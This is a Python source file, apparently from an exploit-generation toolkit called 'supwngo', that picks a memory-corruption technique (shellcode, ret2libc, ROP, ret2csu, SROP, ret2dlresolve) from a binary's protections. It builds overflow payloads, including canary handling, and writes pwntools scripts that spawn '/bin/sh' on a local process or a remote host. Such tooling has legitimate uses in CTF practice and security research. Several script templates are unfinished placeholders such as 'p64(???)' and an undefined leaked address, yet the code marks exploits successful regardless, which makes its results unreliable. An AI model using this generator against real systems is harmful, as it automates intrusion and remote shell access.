"""
Main exploit generation orchestrator.
"""

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from supwngo.core.binary import Binary
from supwngo.core.context import ExploitContext, ExploitGoal, ExploitType
from supwngo.vulns.detector import Vulnerability, VulnType
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class Exploit:
    """
    Generated exploit with payload and script.
    """
    payload: bytes = b""
    script: str = ""
    technique: ExploitType = ExploitType.ROP

    # Metadata
    target_binary: str = ""
    vuln_type: VulnType = VulnType.UNKNOWN
    success: bool = False

    # Components
    rop_chain: bytes = b""
    shellcode: bytes = b""
    leak_payload: bytes = b""

    # Addresses used
    addresses: Dict[str, int] = field(default_factory=dict)


class ExploitGenerator:
    """
    Main exploit generation orchestrator.

    Pipeline:
    1. Analyze vulnerability type and constraints
    2. Determine required primitives (leak, write, control flow)
    3. Select appropriate technique based on protections
    4. Generate ROP chain or shellcode
    5. Build complete exploit payload
    6. Generate pwntools script
    """

    def __init__(self, context: ExploitContext):
        """
        Initialize exploit generator.

        Args:
            context: Exploitation context
        """
        self.context = context
        self.binary = context.binary
        self._exploit: Optional[Exploit] = None

    def generate(
        self,
        vuln: Vulnerability,
        auto_pwn: bool = False,
    ) -> Exploit:
        """
        Generate exploit for vulnerability.

        Args:
            vuln: Vulnerability to exploit
            auto_pwn: Whether to attempt automatic exploitation

        Returns:
            Generated Exploit
        """
        exploit = Exploit(
            target_binary=str(self.binary.path),
            vuln_type=vuln.vuln_type,
        )

        # Select technique
        technique = self._select_technique(vuln)
        exploit.technique = technique
        self.context.exploit_type = technique

        logger.info(f"Selected technique: {technique.name}")

        # Build exploit based on technique
        if technique == ExploitType.SHELLCODE:
            exploit = self._build_shellcode_exploit(vuln, exploit)
        elif technique == ExploitType.RET2LIBC:
            exploit = self._build_ret2libc_exploit(vuln, exploit)
        elif technique == ExploitType.ROP:
            exploit = self._build_rop_exploit(vuln, exploit)
        elif technique == ExploitType.RET2CSU:
            exploit = self._build_ret2csu_exploit(vuln, exploit)
        elif technique == ExploitType.SROP:
            exploit = self._build_srop_exploit(vuln, exploit)
        elif technique == ExploitType.RET2DLRESOLVE:
            exploit = self._build_ret2dlresolve_exploit(vuln, exploit)

        # Generate pwntools script
        exploit.script = self._generate_script(exploit, vuln)

        self._exploit = exploit
        return exploit

    def _select_technique(self, vuln: Vulnerability) -> ExploitType:
        """
        Select best exploitation technique.

        Args:
            vuln: Vulnerability

        Returns:
            Recommended technique
        """
        # If NX disabled, use shellcode
        if not self.context.protections.nx:
            return ExploitType.SHELLCODE

        # If we have libc
        if self.context.libc.path and self.context.libc.system_offset:
            return ExploitType.RET2LIBC

        # If PIE disabled
        if not self.context.protections.pie:
            # Check for __libc_csu_init
            if self.binary and "__libc_csu_init" in self.binary.symbols:
                return ExploitType.RET2CSU
            return ExploitType.ROP

        # PIE enabled without leak
        if "binary_base" not in self.context.leaks:
            return ExploitType.RET2DLRESOLVE

        # Default to ROP
        return ExploitType.ROP

    def _build_shellcode_exploit(
        self,
        vuln: Vulnerability,
        exploit: Exploit,
    ) -> Exploit:
        """Build shellcode-based exploit."""
        from supwngo.exploit.shellcode import ShellcodeGenerator

        shellgen = ShellcodeGenerator(self.context)

        # Generate shellcode
        shellcode = shellgen.generate_execve_sh()
        exploit.shellcode = shellcode

        # Build payload
        offset = vuln.offset
        if self.binary.bits == 64:
            # For 64-bit, we need to put shellcode somewhere accessible
            # and jump to it. This depends on the specific vulnerability.
            padding = b"A" * offset
            ret_addr = b"B" * 8  # Would need actual shellcode address
            exploit.payload = padding + ret_addr + shellcode
        else:
            padding = b"A" * offset
            ret_addr = b"B" * 4
            exploit.payload = padding + ret_addr + shellcode

        exploit.success = True
        return exploit

    def _build_ret2libc_exploit(
        self,
        vuln: Vulnerability,
        exploit: Exploit,
    ) -> Exploit:
        """Build ret2libc exploit."""
        from supwngo.exploit.rop.chain import ROPChainBuilder

        rop_builder = ROPChainBuilder(self.binary, self.context.libc.path)

        # Build ret2libc chain
        chain = rop_builder.build_ret2libc_chain()

        if chain:
            exploit.rop_chain = chain
            exploit.payload = self._build_overflow_payload(vuln, chain)
            exploit.success = True

            # Record addresses
            if self.context.libc.base:
                exploit.addresses["libc_base"] = self.context.libc.base
                exploit.addresses["system"] = self.context.libc.base + self.context.libc.system_offset
                exploit.addresses["binsh"] = self.context.libc.base + self.context.libc.binsh_offset

        return exploit

    def _build_rop_exploit(
        self,
        vuln: Vulnerability,
        exploit: Exploit,
    ) -> Exploit:
        """Build ROP chain exploit."""
        from supwngo.exploit.rop.chain import ROPChainBuilder

        rop_builder = ROPChainBuilder(self.binary)

        # Try to build execve chain
        chain = rop_builder.build_execve_chain()

        if not chain:
            # Fall back to syscall chain
            chain = rop_builder.build_syscall_chain(
                59,  # execve syscall number
                [0, 0, 0],  # Would need proper args
            )

        if chain:
            exploit.rop_chain = chain
            exploit.payload = self._build_overflow_payload(vuln, chain)
            exploit.success = True

        return exploit

    def _build_ret2csu_exploit(
        self,
        vuln: Vulnerability,
        exploit: Exploit,
    ) -> Exploit:
        """Build ret2csu exploit."""
        from supwngo.exploit.rop.techniques import ROPTechniques

        techniques = ROPTechniques(self.binary)

        # Build ret2csu chain
        chain = techniques.ret2csu(
            call_addr=self.context.libc.base + self.context.libc.system_offset if self.context.libc.base else 0,
            arg1=self.context.libc.base + self.context.libc.binsh_offset if self.context.libc.base else 0,
        )

        if chain:
            exploit.rop_chain = chain
            exploit.payload = self._build_overflow_payload(vuln, chain)
            exploit.success = True

        return exploit

    def _build_srop_exploit(
        self,
        vuln: Vulnerability,
        exploit: Exploit,
    ) -> Exploit:
        """Build SROP exploit."""
        from supwngo.exploit.rop.techniques import ROPTechniques

        techniques = ROPTechniques(self.binary)

        # Build sigreturn frame for execve
        chain = techniques.srop_execve()

        if chain:
            exploit.rop_chain = chain
            exploit.payload = self._build_overflow_payload(vuln, chain)
            exploit.success = True

        return exploit

    def _build_ret2dlresolve_exploit(
        self,
        vuln: Vulnerability,
        exploit: Exploit,
    ) -> Exploit:
        """Build ret2dlresolve exploit."""
        from supwngo.exploit.rop.techniques import ROPTechniques

        techniques = ROPTechniques(self.binary)

        # Build ret2dlresolve chain
        chain = techniques.ret2dlresolve("system", [0])

        if chain:
            exploit.rop_chain = chain
            exploit.payload = self._build_overflow_payload(vuln, chain)
            exploit.success = True

        return exploit

    def _build_overflow_payload(
        self,
        vuln: Vulnerability,
        rop_chain: bytes,
    ) -> bytes:
        """
        Build complete overflow payload.

        Args:
            vuln: Vulnerability
            rop_chain: ROP chain bytes

        Returns:
            Complete payload
        """
        offset = vuln.offset

        # Handle canary if present
        if self.context.protections.canary:
            if self.context.stack.canary_value:
                # Insert canary at appropriate offset
                canary_offset = self.context.stack.canary_offset
                padding = b"A" * canary_offset
                canary = self.context.stack.canary_value.to_bytes(
                    8 if self.binary.bits == 64 else 4,
                    'little'
                )
                saved_rbp = b"B" * (8 if self.binary.bits == 64 else 4)
                return padding + canary + saved_rbp + rop_chain
            else:
                logger.warning("Canary present but not leaked")

        # Simple overflow
        padding = b"A" * offset
        return padding + rop_chain

    def _generate_script(
        self,
        exploit: Exploit,
        vuln: Vulnerability,
    ) -> str:
        """
        Generate pwntools exploit script.

        Args:
            exploit: Generated exploit
            vuln: Vulnerability

        Returns:
            Python script string
        """
        script = f'''#!/usr/bin/env python3
"""
SupwnGo Generated Exploit
Target: {exploit.target_binary}
Vulnerability: {vuln.vuln_type.name}
Technique: {exploit.technique.name}
"""

from pwn import *

# Context setup
context.binary = elf = ELF('./{Path(exploit.target_binary).name}')
context.log_level = 'info'
'''

        # Add libc if used
        if self.context.libc.path:
            script += f'''
libc = ELF('{self.context.libc.path}')
'''

        # Connection helper
        script += '''
def get_process():
    if args.REMOTE:
        host, port = args.REMOTE.split(':')
        return remote(host, int(port))
    return process(elf.path)

'''

        # Add exploit function
        script += f'''
def exploit():
    p = get_process()

    # Vulnerability offset
    offset = {vuln.offset}

'''

        # Add technique-specific code
        if exploit.technique == ExploitType.SHELLCODE:
            script += self._gen_shellcode_script(exploit)
        elif exploit.technique == ExploitType.RET2LIBC:
            script += self._gen_ret2libc_script(exploit)
        elif exploit.technique == ExploitType.ROP:
            script += self._gen_rop_script(exploit)
        else:
            script += f'''
    # Payload (hex): {exploit.payload.hex()}
    payload = bytes.fromhex('{exploit.payload.hex()}')
'''

        # Send payload and get shell
        script += '''
    # Send payload
    p.sendline(payload)

    # Get shell
    p.interactive()


if __name__ == '__main__':
    exploit()
'''

        return script

    def _gen_shellcode_script(self, exploit: Exploit) -> str:
        """Generate shellcode exploit script section."""
        return f'''
    # Shellcode
    shellcode = asm(shellcraft.sh())

    # Build payload
    payload = b"A" * offset
    payload += p64(???)  # Return address to shellcode
    payload += shellcode
'''

    def _gen_ret2libc_script(self, exploit: Exploit) -> str:
        """Generate ret2libc exploit script section."""
        return '''
    # Leak libc address (if needed)
    # ... leak code here ...

    # Calculate addresses
    libc.address = leaked_addr - libc.symbols['puts']  # Adjust symbol
    system = libc.symbols['system']
    binsh = next(libc.search(b'/bin/sh'))

    # Build ROP chain
    rop = ROP(elf)
    if context.arch == 'amd64':
        rop.raw(rop.find_gadget(['ret'])[0])  # Stack alignment
        rop.call(system, [binsh])
    else:
        rop.call(system, [binsh])

    # Build payload
    payload = b"A" * offset
    payload += rop.chain()
'''

    def _gen_rop_script(self, exploit: Exploit) -> str:
        """Generate ROP exploit script section."""
        return '''
    # Build ROP chain
    rop = ROP(elf)

    # Add gadgets for your exploit
    # rop.raw(gadget_addr)
    # rop.call(function, [args])

    # Build payload
    payload = b"A" * offset
    payload += rop.chain()
'''

    def get_exploit(self) -> Optional[Exploit]:
        """Get generated exploit."""
        return self._exploit

    def summary(self) -> str:
        """Get generation summary."""
        if not self._exploit:
            return "No exploit generated yet"

        return f"""
Exploit Generation Summary
==========================
Target: {self._exploit.target_binary}
Vulnerability: {self._exploit.vuln_type.name}
Technique: {self._exploit.technique.name}
Success: {self._exploit.success}
Payload size: {len(self._exploit.payload)} bytes
"""
